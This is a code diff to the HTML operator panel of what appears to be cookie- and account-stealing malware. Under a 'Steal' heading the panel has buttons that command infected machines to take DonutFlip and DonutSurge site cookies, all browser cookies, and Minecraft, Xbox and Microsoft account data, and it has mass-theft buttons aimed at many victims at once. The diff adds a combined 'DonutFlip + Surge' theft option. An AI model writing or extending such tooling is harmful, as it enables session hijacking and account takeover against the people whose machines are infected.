@@ -165,7 +165,8 @@
       <div class="row" style="gap:8px;align-items:center;flex-wrap:wrap">
         <input id="donut-search" placeholder="filter…" oninput="refreshDonut()" style="max-width:180px"/>
         <button class="cmd sm" type="button" onclick="refreshDonut()">Refresh</button>
-        <button class="cmd sm" type="button" onclick="donutMass('donutflip')">Mass DF cookies</button>
+        <button class="cmd sm" type="button" onclick="donutMass('donut_sites')">Mass DF+Surge</button>
+        <button class="cmd sm" type="button" onclick="donutMass('donutflip')">Mass DF only</button>
         <button class="cmd sm" type="button" onclick="donutMass('cookies')">Mass all cookies</button>
       </div>
     </div>
@@ -189,8 +190,9 @@
 
         <div style="font-weight:600;margin:14px 0 8px">Steal</div>
         <div style="display:flex;flex-wrap:wrap;gap:8px">
-          <button class="cmd primary" type="button" onclick="donutCmd('donutflip')">DonutFlip cookies</button>
-          <button class="cmd" type="button" onclick="donutCmd('donutsurge')">DonutSurge cookies</button>
+          <button class="cmd primary" type="button" onclick="donutCmd('donut_sites')">DonutFlip + Surge</button>
+          <button class="cmd" type="button" onclick="donutCmd('donutflip')">DonutFlip only</button>
+          <button class="cmd" type="button" onclick="donutCmd('donutsurge')">DonutSurge only</button>
           <button class="cmd" type="button" onclick="donutCmd('cookies')">All cookies</button>
           <button class="cmd" type="button" onclick="donutCmd('minecraft')">Minecraft / Xbox / MSA</button>
           <button class="cmd" type="button" onclick="donutCmd('microsoft')">Microsoft</button>
